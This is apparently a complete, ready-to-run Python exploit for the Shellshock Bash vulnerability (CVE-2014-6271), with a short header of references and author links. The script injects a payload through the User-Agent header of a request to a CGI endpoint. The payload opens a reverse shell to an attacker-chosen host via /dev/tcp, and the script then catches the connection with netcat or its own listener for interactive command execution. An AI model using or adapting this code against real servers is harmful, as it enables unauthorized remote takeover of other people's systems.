"""
Shellshock Exploit
	CVE-2014-6271

Affected versions: from GNU Bash 1.14 up to GNU Bash 4.3

References:
	https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-6271
	https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf
	https://www.exploit-db.com/docs/english/48112-the-shellshock-attack-%5Bpaper%5D.pdf
	https://success.trendmicro.com/dcx/s/solution/1105233-trend-micro-products-and-the-shellshock-linux-bash-vulnerability-bash-bug-cve-2014-6271-and-cve?language=en_US



Github:
	https://github.com/AlissonFaoli
Linkedin:
	https://linkedin.com/alisson-faoli

"""

#!/usr/bin/python3
import requests, sys, socket, re, threading, subprocess, os



HELP = f'''
Usage:
	python3 {sys.argv[0]} [Vulnerable URL] [LHOST] [LPORT]
Example:
	python3 {sys.argv[0]} http://vulnerablewebsite.com/cgi-bin/test.cgi 109.876.654.321 1234
'''


def exploit(url, lhost, lport):
	payload = '() { :; }; echo; echo; /bin/bash -c "bash -i >& /dev/tcp/' + lhost + '/' + lport + ' 0>&1 &"'
	headers = {
		'User-Agent' : payload
			}
	try:
		r = requests.get(url, headers=headers)
		if r.text.strip():
			print(r.text)

	except Exception as error:
		print(error)


def shell(url, lhost, lport):
	if sys.platform == 'linux':
		try:
			nc = subprocess.getoutput('which nc')

		except:
			nc = None
	else:
		nc = None
	
	if nc and 'not found' not in nc:
		os.system(f'{nc} -lvp {lport}')

	else:
		try:
			pors, rhost = re.findall(r'[0-9a-z\.:]+', url)[:2]
			rport = int(rhost.split(':')[1]) if len(rhost.split(':')) > 1 else 80 if pors == 'http:' else 443
			print(f'Attempting connection to {rhost} on port {rport}...')
			with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
				sock.bind(('', int(lport)))
				sock.listen(1)
				print(f'Listening on port {lport}')
				con, addr = sock.accept()
				print(f'Connected to {addr[0]}:{addr[1]}\n')
				with con:
					resp = con.recv(4096)
					print(resp.decode())
					con.send(b'\n')
					try:
					
						while True:
							resp = ''
							
							for _ in range(2):
								resp += con.recv(4096).decode()

							resp = '\n'.join(resp.splitlines()[:-1])

							if 'cmd' in locals() and resp and resp.splitlines()[0] == cmd.strip():
								resp = '\n'.join(resp.splitlines()[1:])

							cmd = input(resp)
							if cmd == 'exit':
								break
							
							con.send(f'{cmd}\r\n'.encode())
					
					except KeyboardInterrupt:
						pass
					except Exception as error:
						print(error)

		except Exception as error:
			print(error)


def main(url, lhost, lport):

	t1 = threading.Thread(target=shell, args=(url, lhost, lport), daemon=False)
	t2 = threading.Thread(target=exploit, args=(url, lhost, lport), daemon=True)
	t1.start()
	t2.start()



if __name__ == '__main__':
	if len(sys.argv) != 4:
		print(HELP)
	else:
		_, url, lhost, lport = sys.argv
		main(url, lhost, lport)


